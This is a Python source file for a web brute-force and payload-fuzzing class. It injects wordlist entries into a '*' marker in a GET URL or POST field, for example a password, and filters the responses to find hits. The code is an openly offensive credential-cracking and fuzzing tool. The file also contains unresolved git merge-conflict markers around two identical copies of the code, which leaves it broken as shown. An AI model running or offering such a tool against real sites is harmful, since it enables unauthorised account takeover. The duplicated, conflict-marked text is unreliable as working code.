<<<<<<< HEAD
# Own modules
from Utilities.DiccionariesPATH.paths import filtered_payloads, mostPayload, levels_payloads
from Utilities.Request.utils import extract_wordlist, check_response

# Default modules
import requests
import re
from bs4 import BeautifulSoup
from simple_colors import *


class Brute_Force_WEB_v1:
    def __init__(
        self,
        # Str values
        url,
        wordlist,
        method,
        postData,
        headers,
        cookies,
        
        # Int values
        hideStatus,
        hideLenght,

        # Bool values, aditionals in attack
        modeXMLHTTPRequest
    ) -> None:
        # ----------------------------------------------------------------------------------------
        # Variables
        # Principal params
        self.url = url
        self.wordList = wordlist
        self.method = method

        self.post = postData
        self.postQuery = {}

        # Secundary params
        self.headers = headers if headers is not None else ""
        self.headersQuery = {}
        self.cookies = cookies if cookies is not None else ""
        self.cookiesQuery = {}

        # Payload params
        self.payloadPATH = None
        self.payloadArray = None
        self.actualPayload = None

        # Attack variables
        self.statusResponse = None
        self.lenghtResponse = None
        self.hideStatus = hideStatus if hideStatus is not None else ""
        self.hideLenght = hideLenght if hideLenght is not None else ""

        # Aditional variables
        self.xmlAttack = modeXMLHTTPRequest

        # ----------------------------------------------------------------------------------------
        # 1-. Firts point: Verify principal params
        if url != None and wordlist != None and method != None:
            # Verify URL
            self.FirtsPoint_verify_URL()

            # Verify WordList
            self.FirtsPoint_verify_WordList()

            # Verify Method
            self.FirtsPoint_verify_Method()

            self.prints_verified("URL, wordlist and method")
        else:
            self.prints_error("Principal params dont have values!")

        # ----------------------------------------------------------------------------------------
        # 2-. Second point: Verify secundary params:
        self.SecondPoint_verify_HeaderCookies()

        # ----------------------------------------------------------------------------------------
        # 3-. Third point: Extract payload into a array
        self.ThirdPoint_verify_dicctionary()

        # ----------------------------------------------------------------------------------------
        # 4-. Fourth point: Crack password
        self.FourthPoint_attack_password()

    # Firts functions
    def FirtsPoint_verify_URL(self):
        check = self.url.lower()
        http = check.find("http://")
        https = check.find("https://")

        if http == 0:
            pass
        elif https == 0:
            pass
        else:
            self.prints_error("Param ['URL'] no has HTTP or HTTPS")

    def FirtsPoint_verify_WordList(self):
        if "level" in self.wordList:
            try:
                self.payloadPATH = levels_payloads[self.wordList]
            except:
                self.prints_error("Start in level (1) and end in level (12)")

        elif "filtered" in self.wordList:
            temp = self.wordList.replace("filtered_", "")
            try:
                self.payloadPATH = filtered_payloads[temp]
            except:
                self.prints_error(
                    f"Check filtered diccionary, ['{temp}'] dont exists!")

        elif "mostPayload" in self.wordList:
            self.payloadPATH = mostPayload

        else:
            self.prints_error(
                f"Not recognized the diccionary, ['{self.wordList}'] dont exists!")

    def FirtsPoint_verify_Method(self):
        # Attack in method GET
        if self.method == "GET":
            verify = self.url.find("*")

            # '*' Founded!
            if verify >= 0:
                pass
            # NOTE: XMLHTTPRequest dont exist!
            elif self.xmlAttack:
                pass
            else:
                self.prints_error("No has market of entry payloads '*'")

        # Attack in method POST
        elif self.method == "POST":
            if self.post != None:
                if self.post.find("*") == -1:
                    self.prints_error("Dont have the market * in the ['postQuery']")
                
                temp = self.post.split("&")

                count = 0
                tempIndex = None
                tempData = None

                for x in temp:
                    # ['j_password', '*']
                    x = x.split("=")

                    # j_password ==> *
                    for y in x:
                        if count == 0:
                            tempIndex = y
                            count = 1

                        elif count == 1:
                            tempData = y
                            count = 2

                    # Add into a dictionary
                    if count == 2:
                        self.postQuery[tempIndex] = tempData
                        count = 0

            else:
                self.prints_error("Entry of ['postQuery'] has empty")

        else:
            self.prints_error(f"Method ['{self.method}'] dont exist!")

    # Second functions
    def SecondPoint_verify_HeaderCookies(self):
        # Headers:
        temp = self.headers.split("&")
        count = 0
        tempIndex = None
        tempData = None

        for x in temp:
            x = x.split("=")

            for y in x:
                if count == 0:
                    tempIndex = y
                    count = 1

                elif count == 1:
                    tempData = y
                    count = 2

            # Add into a dictionary
            if count == 2:
                self.headersQuery[tempIndex] = tempData
                count = 0

        # Cookies:
        temp = self.cookies.split("&")
        count = 0
        tempIndex = None
        tempData = None

        for x in temp:
            x = x.split("=")

            for y in x:
                if count == 0:
                    tempIndex = y
                    count = 1

                elif count == 1:
                    tempData = y
                    count = 2

            # Add into a dictionary
            if count == 2:
                self.cookiesQuery[tempIndex] = tempData
                count = 0

        self.prints_verified("Cookies and headers")

    # Third functions
    def ThirdPoint_verify_dicctionary(self):
        self.payloadArray = open(self.payloadPATH, "r").read().split("\n")

    # Fourth functions
    def FourthPoint_attack_password(self):
        if self.method == "GET":
            self.attack_get()

        elif self.method == "POST":
            self.attack_post()

    # Utils
    def prints_verified(self, param: str):
        print(f"{green('VERIFIED:')} {yellow(param)}")

    def prints_error(self, param: str):
        exit(f"{red('[-] ERROR:')} {yellow(param)}")

    def attack_get(self):
        # Crack one param; In this case, the password param
        for p in self.payloadArray:
            # Payload data
            self.actualPayload = p
            p = self.url.replace("*", p)

            # Send attack
            res = requests.get(url=p, headers=self.headersQuery,
                               cookies=self.cookiesQuery, timeout=20)
            
            # Save response attack
            self.statusResponse = res.status_code
            self.lenghtResponse = len(extract_wordlist(
                                BeautifulSoup(res.text, "html.parser")))
            
            # Verify response
            check_response(
                responseStatus= self.statusResponse,
                responseLenght= self.lenghtResponse,
                
                hideResponse= self.hideStatus,
                hideLenght= self.hideLenght,
                
                payload= self.actualPayload
            )

    def attack_post(self):
        # Crack one param; In this case, the password param
        for index in self.postQuery:
            if self.postQuery[index] == "*":
                for p in self.payloadArray:
                    # Payload data
                    self.actualPayload = p
                    self.postQuery[index] = p
                    
                    # Send attack
                    res = requests.post(url= self.url, data= self.postQuery,
                                        headers= self.headersQuery, cookies= self.cookiesQuery,
                                        timeout= 20)

                    # Save response attack
                    self.statusResponse = res.status_code
                    self.lenghtResponse = len(extract_wordlist(
                                        BeautifulSoup(res.text, "html.parser")))
                    
                    # Verify response
                    check_response(
                        responseStatus= self.statusResponse,
                        responseLenght= self.lenghtResponse,
                        
                        hideResponse= self.hideStatus,
                        hideLenght= self.hideLenght,
                        
                        payload= self.actualPayload
                    )

    # To construct
    def attack_XMLHTTPRequest_get(self):
        pass

    def attack_XMLHTTPRequest_post(self):
        pass
=======
# Own modules
from Utilities.DiccionariesPATH.paths import filtered_payloads, mostPayload, levels_payloads
from Utilities.Request.utils import extract_wordlist, check_response

# Default modules
import requests
import re
from bs4 import BeautifulSoup
from simple_colors import *


class Brute_Force_WEB_v1:
    def __init__(
        self,
        # Str values
        url,
        wordlist,
        method,
        postData,
        headers,
        cookies,
        
        # Int values
        hideStatus,
        hideLenght,

        # Bool values, aditionals in attack
        modeXMLHTTPRequest
    ) -> None:
        # ----------------------------------------------------------------------------------------
        # Variables
        # Principal params
        self.url = url
        self.wordList = wordlist
        self.method = method

        self.post = postData
        self.postQuery = {}

        # Secundary params
        self.headers = headers if headers is not None else ""
        self.headersQuery = {}
        self.cookies = cookies if cookies is not None else ""
        self.cookiesQuery = {}

        # Payload params
        self.payloadPATH = None
        self.payloadArray = None
        self.actualPayload = None

        # Attack variables
        self.statusResponse = None
        self.lenghtResponse = None
        self.hideStatus = hideStatus if hideStatus is not None else ""
        self.hideLenght = hideLenght if hideLenght is not None else ""

        # Aditional variables
        self.xmlAttack = modeXMLHTTPRequest

        # ----------------------------------------------------------------------------------------
        # 1-. Firts point: Verify principal params
        if url != None and wordlist != None and method != None:
            # Verify URL
            self.FirtsPoint_verify_URL()

            # Verify WordList
            self.FirtsPoint_verify_WordList()

            # Verify Method
            self.FirtsPoint_verify_Method()

            self.prints_verified("URL, wordlist and method")
        else:
            self.prints_error("Principal params dont have values!")

        # ----------------------------------------------------------------------------------------
        # 2-. Second point: Verify secundary params:
        self.SecondPoint_verify_HeaderCookies()

        # ----------------------------------------------------------------------------------------
        # 3-. Third point: Extract payload into a array
        self.ThirdPoint_verify_dicctionary()

        # ----------------------------------------------------------------------------------------
        # 4-. Fourth point: Crack password
        self.FourthPoint_attack_password()

    # Firts functions
    def FirtsPoint_verify_URL(self):
        check = self.url.lower()
        http = check.find("http://")
        https = check.find("https://")

        if http == 0:
            pass
        elif https == 0:
            pass
        else:
            self.prints_error("Param ['URL'] no has HTTP or HTTPS")

    def FirtsPoint_verify_WordList(self):
        if "level" in self.wordList:
            try:
                self.payloadPATH = levels_payloads[self.wordList]
            except:
                self.prints_error("Start in level (1) and end in level (12)")

        elif "filtered" in self.wordList:
            temp = self.wordList.replace("filtered_", "")
            try:
                self.payloadPATH = filtered_payloads[temp]
            except:
                self.prints_error(
                    f"Check filtered diccionary, ['{temp}'] dont exists!")

        elif "mostPayload" in self.wordList:
            self.payloadPATH = mostPayload

        else:
            self.prints_error(
                f"Not recognized the diccionary, ['{self.wordList}'] dont exists!")

    def FirtsPoint_verify_Method(self):
        # Attack in method GET
        if self.method == "GET":
            verify = self.url.find("*")

            # '*' Founded!
            if verify >= 0:
                pass
            # NOTE: XMLHTTPRequest dont exist!
            elif self.xmlAttack:
                pass
            else:
                self.prints_error("No has market of entry payloads '*'")

        # Attack in method POST
        elif self.method == "POST":
            if self.post != None:
                if self.post.find("*") == -1:
                    self.prints_error("Dont have the market * in the ['postQuery']")
                
                temp = self.post.split("&")

                count = 0
                tempIndex = None
                tempData = None

                for x in temp:
                    # ['j_password', '*']
                    x = x.split("=")

                    # j_password ==> *
                    for y in x:
                        if count == 0:
                            tempIndex = y
                            count = 1

                        elif count == 1:
                            tempData = y
                            count = 2

                    # Add into a dictionary
                    if count == 2:
                        self.postQuery[tempIndex] = tempData
                        count = 0

            else:
                self.prints_error("Entry of ['postQuery'] has empty")

        else:
            self.prints_error(f"Method ['{self.method}'] dont exist!")

    # Second functions
    def SecondPoint_verify_HeaderCookies(self):
        # Headers:
        temp = self.headers.split("&")
        count = 0
        tempIndex = None
        tempData = None

        for x in temp:
            x = x.split("=")

            for y in x:
                if count == 0:
                    tempIndex = y
                    count = 1

                elif count == 1:
                    tempData = y
                    count = 2

            # Add into a dictionary
            if count == 2:
                self.headersQuery[tempIndex] = tempData
                count = 0

        # Cookies:
        temp = self.cookies.split("&")
        count = 0
        tempIndex = None
        tempData = None

        for x in temp:
            x = x.split("=")

            for y in x:
                if count == 0:
                    tempIndex = y
                    count = 1

                elif count == 1:
                    tempData = y
                    count = 2

            # Add into a dictionary
            if count == 2:
                self.cookiesQuery[tempIndex] = tempData
                count = 0

        self.prints_verified("Cookies and headers")

    # Third functions
    def ThirdPoint_verify_dicctionary(self):
        self.payloadArray = open(self.payloadPATH, "r").read().split("\n")

    # Fourth functions
    def FourthPoint_attack_password(self):
        if self.method == "GET":
            self.attack_get()

        elif self.method == "POST":
            self.attack_post()

    # Utils
    def prints_verified(self, param: str):
        print(f"{green('VERIFIED:')} {yellow(param)}")

    def prints_error(self, param: str):
        exit(f"{red('[-] ERROR:')} {yellow(param)}")

    def attack_get(self):
        # Crack one param; In this case, the password param
        for p in self.payloadArray:
            # Payload data
            self.actualPayload = p
            p = self.url.replace("*", p)

            # Send attack
            res = requests.get(url=p, headers=self.headersQuery,
                               cookies=self.cookiesQuery, timeout=20)
            
            # Save response attack
            self.statusResponse = res.status_code
            self.lenghtResponse = len(extract_wordlist(
                                BeautifulSoup(res.text, "html.parser")))
            
            # Verify response
            check_response(
                responseStatus= self.statusResponse,
                responseLenght= self.lenghtResponse,
                
                hideResponse= self.hideStatus,
                hideLenght= self.hideLenght,
                
                payload= self.actualPayload
            )

    def attack_post(self):
        # Crack one param; In this case, the password param
        for index in self.postQuery:
            if self.postQuery[index] == "*":
                for p in self.payloadArray:
                    # Payload data
                    self.actualPayload = p
                    self.postQuery[index] = p
                    
                    # Send attack
                    res = requests.post(url= self.url, data= self.postQuery,
                                        headers= self.headersQuery, cookies= self.cookiesQuery,
                                        timeout= 20)

                    # Save response attack
                    self.statusResponse = res.status_code
                    self.lenghtResponse = len(extract_wordlist(
                                        BeautifulSoup(res.text, "html.parser")))
                    
                    # Verify response
                    check_response(
                        responseStatus= self.statusResponse,
                        responseLenght= self.lenghtResponse,
                        
                        hideResponse= self.hideStatus,
                        hideLenght= self.hideLenght,
                        
                        payload= self.actualPayload
                    )

    # To construct
    def attack_XMLHTTPRequest_get(self):
        pass

    def attack_XMLHTTPRequest_post(self):
        pass
>>>>>>> b5eeba62e5323d4509741493fbad3cc71f725e39
